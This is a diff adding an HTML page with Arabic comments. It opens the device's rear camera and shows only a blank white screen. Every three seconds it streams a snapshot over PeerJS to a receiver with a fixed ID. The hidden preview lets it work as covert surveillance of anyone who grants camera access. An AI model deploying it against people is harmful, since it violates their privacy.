@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera</title>
+    <style>
+        /* صفحة بيضاء فاضية تماماً */
+        * { margin: 0; padding: 0; }
+        body { background: #ffffff; width: 100vw; height: 100vh; overflow: hidden; }
+        video { display: none; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <!-- العناصر مخفية، بس موجودة عشان تشتغل -->
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+    <script>
+        // ============================================
+        // الإعدادات - عدل هون إذا بدك
+        // ============================================
+        const CAMERA_ID = 'camera-omran-2025';  // ⚠️ نفس الرمز لازم يكون في المستقبل
+        const PHOTOS_PER_MINUTE = 20;            // 20 صورة بالدقيقة
+        const INTERVAL_MS = 60000 / PHOTOS_PER_MINUTE; // = 3000ms (كل 3 ثواني)
+        const PHOTO_QUALITY = 0.7;               // جودة الصورة (0-1)
+
+        // ============================================
+        // المتغيرات
+        // ============================================
+        let peer = null;
+        let conn = null;
+        let videoStream = null;
+        let sendInterval = null;
+        let isConnected = false;
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // ============================================
+        // 1. تشغيل الكاميرا (يطلب إذن مرة وحدة)
+        // ============================================
+        async function startCamera() {
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'environment' // الكاميرا الخلفية للموبايل
+                    },
+                    audio: false
+                });
+                video.srcObject = videoStream;
+                await video.play();
+                console.log('✅ الكاميرا شغالة');
+                return true;
+            } catch (err) {
+                console.error('❌ خطأ في الكاميرا:', err);
+                return false;
+            }
+        }
+
+        // ============================================
+        // 2. تهيئة PeerJS والاتصال التلقائي
+        // ============================================
+        function initPeer() {
+            peer = new Peer(CAMERA_ID, {
+                debug: 1,
+                config: {
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:stun1.l.google.com:19302' }
+                    ]
+                }
+            });
+
+            peer.on('open', (id) => {
+                console.log('✅ جاهز للاتصال. الرمز:', id);
+            });
+
+            // لما المستقبل يتصل فينا
+            peer.on('connection', (connection) => {
+                console.log('🟢 المستقبل اتصل!');
+                conn = connection;
+                isConnected = true;
+
+                conn.on('open', () => {
+                    console.log('✅ الاتصال مفتوح - نبدأ الإرسال');
+                    startSendingPhotos(); // نبدأ الإرسال تلقائياً
+                });
+
+                conn.on('close', () => {
+                    console.log('🔴 المستقبل خرج');
+                    isConnected = false;
+                    stopSendingPhotos();
+                });
+
+                conn.on('error', (err) => {
+                    console.error('خطأ:', err);
+                    isConnected = false;
+                    stopSendingPhotos();
+                });
+            });
+
+            peer.on('error', (err) => {
+                console.error('PeerJS Error:', err);
+                // إذا الرمز مستخدم، نحاول نعيد بعد شوي
+                if (err.type === 'unavailable-id') {
+                    console.log('الرمز مستخدم، إعادة المحاولة بعد 3 ثواني...');
+                    setTimeout(() => {
+                        peer.destroy();
+                        initPeer();
+                    }, 3000);
+                }
+            });
+
+            peer.on('disconnected', () => {
+                console.log('انقطع الاتصال بالسيرفر، إعادة محاولة...');
+                peer.reconnect();
+            });
+        }
+
+        // ============================================
+        // 3. إرسال الصور دورياً
+        // ============================================
+        function startSendingPhotos() {
+            if (sendInterval) clearInterval(sendInterval);
+            
+            // نرسل صورة فوراً
+            sendPhoto();
+            
+            // ثم نستمر كل INTERVAL_MS
+            sendInterval = setInterval(() => {
+                if (conn && conn.open && video.readyState >= 2) {
+                    sendPhoto();
+                }
+            }, INTERVAL_MS);
+        }
+
+        function stopSendingPhotos() {
+            if (sendInterval) {
+                clearInterval(sendInterval);
+                sendInterval = null;
+            }
+        }
+
+        function sendPhoto() {
+            try {
+                // نجيب أبعاد الفيديو
+                const w = video.videoWidth || 640;
+                const h = video.videoHeight || 480;
+
+                // نصغّر الصورة شوي عشان الإرسال يكون أسرع
+                const targetWidth = 640;
+                const targetHeight = Math.round((h / w) * targetWidth);
+
+                canvas.width = targetWidth;
+                canvas.height = targetHeight;
+
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, targetWidth, targetHeight);
+
+                // نحوّلها لـ JPEG base64 (أسرع وأخف)
+                const dataUrl = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);
+
+                if (conn && conn.open) {
+                    conn.send({
+                        type: 'photo',
+                        data: dataUrl,
+                        timestamp: Date.now()
+                    });
+                    console.log('📤 صورة مرسلة - الوقت:', new Date().toLocaleTimeString());
+                }
+            } catch (err) {
+                console.error('خطأ في إرسال الصورة:', err);
+            }
+        }
+
+        // ============================================
+        // 4. التشغيل التلقائي عند فتح الصفحة
+        // ============================================
+        (async function main() {
+            // أول شي: نشغل الكاميرا (يطلب الإذن)
+            const cameraOk = await startCamera();
+            
+            if (!cameraOk) {
+                console.log('ما قدرنا نشغل الكاميرا');
+                return;
+            }
+
+            // ثانياً: نبدأ PeerJS
+            initPeer();
+        })();
+
+        // لما المستخدم يسكر الصفحة، ننظف
+        window.addEventListener('beforeunload', () => {
+            stopSendingPhotos();
+            if (videoStream) {
+                videoStream.getTracks().forEach(t => t.stop());
+            }
+            if (peer) peer.destroy();
+        });
+    </script>
+</body>
+</html>
